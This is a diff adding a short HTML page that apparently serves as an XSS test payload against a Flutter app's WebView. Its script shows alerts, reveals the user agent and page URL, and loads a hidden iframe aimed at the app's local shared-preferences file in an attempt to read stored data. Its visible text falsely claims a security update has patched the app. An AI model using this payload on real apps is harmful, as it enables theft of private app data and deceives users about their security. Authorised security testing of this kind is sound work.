@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        alert('XSS TEST: App is vulnerable!');
+        alert('User Agent: ' + navigator.userAgent);
+        alert('URL: ' + window.location.href);
+        
+        // Try to access files
+        setTimeout(() => {
+            try {
+                var iframe = document.createElement('iframe');
+                iframe.src = 'file:///data/data/com.example.flutter_application_1/shared_prefs/FlutterSharedPreferences.xml';
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+                alert('Attempted file access...');
+            } catch(e) {
+                alert('File access failed: ' + e.message);
+            }
+        }, 1000);
+    </script>
+    
+    <h1>Security Update Complete</h1>
+    <p>Your app has been successfully patched.</p>
+</body>
+</html>
